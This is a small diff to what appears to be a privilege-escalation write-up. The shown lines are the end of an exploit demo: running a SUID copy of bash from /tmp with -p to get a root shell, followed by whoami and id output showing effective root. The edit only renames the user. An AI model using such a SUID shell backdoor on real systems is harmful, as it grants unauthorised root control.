@@ -41,7 +41,7 @@ dreg@fr33project:~$ /tmp/bash -p
 bash-5.0# whoami
 root
 bash-5.0# id
-uid=1003(hacker) gid=1003(hacker) euid=0(root) egid=0(root) groups=0(root),27(sudo),1003(hacker)
+uid=1003(dreg) gid=1003(dreg) euid=0(root) egid=0(root) groups=0(root),27(sudo),1003(dreg)
 bash-5.0#
 ```
 
